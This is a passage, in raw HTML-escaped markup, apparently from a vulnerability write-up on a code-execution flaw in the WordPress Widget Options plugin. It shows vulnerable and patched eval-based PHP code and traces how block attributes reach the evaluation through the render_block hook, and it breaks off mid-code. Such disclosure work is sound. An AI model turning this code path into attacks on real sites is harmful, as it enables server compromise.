class=&#34;nv&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The vulnerability originates from the &lt;code&gt;widgetopts_safe_eval&lt;/code&gt; function, which allows execution of arbitrary commands via &lt;code&gt;eval&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched version (v4.1.3):&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;widgetopts_safe_eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$expression&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;widgetopts_is_widget_or_post_preview&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Always&amp;ensp;return&amp;ensp;true&amp;ensp;for&amp;ensp;previews&amp;ensp;unless&amp;ensp;the&amp;ensp;user&amp;ensp;is&amp;ensp;an&amp;ensp;administrator&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;current_user_can&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;administrator&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$validation_result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;widgetopts_validate_expression&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$expression&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$validation_result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;valid&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;stristr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$expression&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;return&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$expression&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;return&amp;ensp;(&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$expression&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;);&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ob_start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;bool&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$expression&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;\Exception&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;\Error&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;\ParseError&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;\Throwable&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ob_end_clean&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch validates &lt;code&gt;$expression&lt;/code&gt; by calling the function &lt;code&gt;widgetopts_validate_expression&lt;/code&gt;&#xA;(&lt;a href=&#34;https://plugins.trac.wordpress.org/browser/widget-options/trunk/includes/extras.php#L534&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://plugins.trac.wordpress.org/browser/widget-options/trunk/includes/extras.php#L534&lt;/a&gt;)&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;This plugin registers a &lt;strong&gt;filter hook&lt;/strong&gt; on &lt;code&gt;render_block&lt;/code&gt;:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;add_filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;render_block&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$block_content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$parsed_block&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$obj&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_admin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;add_filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;render_block_&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$obj&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;blockopts_filter_before_display&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$block_content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;The &lt;code&gt;render_block&lt;/code&gt; hook is triggered every time a block is rendered in the &lt;strong&gt;WordPress default editor (Gutenberg)&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;If not in the admin environment (&lt;code&gt;!is_admin()&lt;/code&gt;), the plugin attaches an additional filter for the current block (&lt;code&gt;render_block_{block_name}&lt;/code&gt;) to process the content before displaying it, via the function &lt;code&gt;blockopts_filter_before_display&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;blockopts_filter_before_display&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$block_content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$parsed_block&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$obj&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$parsed_block&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$parsed_block&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;attrs&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$parsed_block&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;attrs&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;extended_widget_opts&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$parsed_block&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;attrs&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;extended_widget_opts_block&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;activate&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$widget_options&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span 